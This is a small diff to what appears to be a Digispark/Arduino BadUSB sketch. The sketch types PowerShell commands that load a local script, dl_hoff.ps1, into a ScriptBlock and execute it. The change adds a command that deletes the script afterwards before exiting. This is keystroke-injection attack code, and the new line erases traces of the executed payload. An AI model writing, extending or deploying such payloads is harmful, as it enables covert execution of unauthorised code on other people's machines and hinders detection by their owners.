@@ -19,6 +19,7 @@ void loop() {
   p("$f = Get-Content .\\dl_hoff.ps1 -Raw");
   p("$s = [System.Management.Automation.ScriptBlock]::Create($f)");
   p("& $s");
+  p("del .\\dl_hoff.ps1");
   p("exit");
   for(;;){
     digitalWrite(1, HIGH);
